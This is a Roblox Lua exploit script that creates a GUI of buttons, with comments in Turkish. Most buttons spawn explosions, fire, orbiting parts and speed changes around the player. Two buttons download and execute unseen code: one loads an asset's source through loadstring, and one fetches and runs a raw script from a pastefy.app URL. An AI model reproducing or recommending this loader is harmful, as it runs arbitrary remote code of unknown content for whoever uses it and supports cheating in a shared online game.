title: Localqw6 gui guest by Omer mod
script:
local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Buton ekleme fonksiyonu
local function createButton(name, text, position, action)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.2, 0, 0.1, 0)
    button.Position = position
    button.Text = text
    button.TextScaled = true
    button.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
    button.Parent = screenGui
    button.MouseButton1Click:Connect(action)
end

-- 1. GUEST HJ: Renkli bloklar döner ve karakteri takip eder
local function guestHJ()
    local character = player.Character or player.CharacterAdded:Wait()
    if not character:FindFirstChild("HumanoidRootPart") then return end
    for i = 1, 10 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1, 1, 1)
        part.Shape = Enum.PartType.Ball
        part.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
        part.Anchored = true
        part.Parent = workspace

        coroutine.wrap(function()
            while true do
                local angle = tick() * math.pi / 5 + i
                part.Position = character.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * 5, 2, math.sin(angle) * 5)
                task.wait(0.03)
            end
        end)()
    end
end

-- 2. BOAM: Mesaj ve patlamalar
local function boam()
    local message = Instance.new("Message", workspace)
    message.Text = "UZAKLAŞIN BOMBA GELİYOR! X 🏃"
    task.wait(3)
    message:Destroy()

    for i = 1, 5 do
        local explosion = Instance.new("Explosion")
        explosion.Position = player.Character.HumanoidRootPart.Position + Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
        explosion.BlastRadius = 10
        explosion.Parent = workspace
        task.wait(1)
    end
end

-- 3. JKOP: Vücut yanma ve hızlanma
local function jkop()
    local character = player.Character or player.CharacterAdded:Wait()
    if not character:FindFirstChild("HumanoidRootPart") then return end
    character.Humanoid.WalkSpeed = 100
    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            local fire = Instance.new("Fire", part)
            fire.Size = 5
        end
    end
    task.wait(10)
    character.Humanoid.WalkSpeed = 16
end

-- 4. GUEST FTO: Script çalıştırma
local function guestFTO()
    local str_srce = "14682300022"
    loadstring(game:GetObjects("rbxassetid://" .. str_srce)[1].Source)()
end

-- 5. GUEST OKP: Devasa top düşmesi ve dönüş
local function guestOKP()
    local top = Instance.new("Part")
    top.Size = Vector3.new(10, 10, 10)
    top.BrickColor = BrickColor.Red()
    top.Shape = Enum.PartType.Ball
    top.Anchored = true
    top.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 50, 0)
    top.Parent = workspace

    task.wait(2)
    top.Anchored = false
    local fire = Instance.new("Fire", top)
    fire.Size = 10

    coroutine.wrap(function()
        while true do
            local character = player.Character or player.CharacterAdded:Wait()
            top.Position = character.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
            task.wait(0.1)
        end
    end)()
end

-- 6. GUEST ÖZEL: Script çalıştırma
local function guestOzel()
    loadstring(game:HttpGet("https://pastefy.app/NQUCwCYI/raw"))()
end

-- 7. FLAKON: Dönen toplar ve patlamalar
local function flakon()
    local character = player.Character or player.CharacterAdded:Wait()
    local balls = {}

    for i = 1, 5 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1, 1, 1)
        part.Shape = Enum.PartType.Ball
        part.BrickColor = BrickColor.Black()
        part.Material = Enum.Material.Neon
        part.Parent = workspace
        table.insert(balls, part)
    end

    coroutine.wrap(function()
        while true do
            for i, ball in ipairs(balls) do
                local angle = tick() * math.pi + i
                ball.Position = character.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * 5, 0, math.sin(angle) * 5)
            end
            task.wait(0.03)
        end
    end)()
end

-- 8. GUEST JPO: El yanması ve kafa kopması
local function guestJPO()
    local character = player.Character or player.CharacterAdded:Wait()
    local head = character:FindFirstChild("Head")
    if head then
        local fire = Instance.new("Fire", head)
        fire.Size = 5
        head:Destroy()
    end
end

-- Butonları oluşturma
createButton("Guest HJ", "GUEST HJ", UDim2.new(0.1, 0, 0.1, 0), guestHJ)
createButton("Boam", "BOAM", UDim2.new(0.4, 0, 0.1, 0), boam)
createButton("Jkop", "JKOP", UDim2.new(0.7, 0, 0.1, 0), jkop)
createButton("Guest FTO", "GUEST FTO", UDim2.new(0.1, 0, 0.3, 0), guestFTO)
createButton("Guest OKP", "GUEST OKP", UDim2.new(0.4, 0, 0.3, 0), guestOKP)
createButton("Guest Özel", "GUEST ÖZEL", UDim2.new(0.7, 0, 0.3, 0), guestOzel)
createButton("Flakon", "FLAKON", UDim2.new(0.1, 0, 0.5, 0), flakon)
createButton("Guest JPO", "GUEST JPO", UDim2.new(0.4, 0, 0.5, 0), guestJPO)
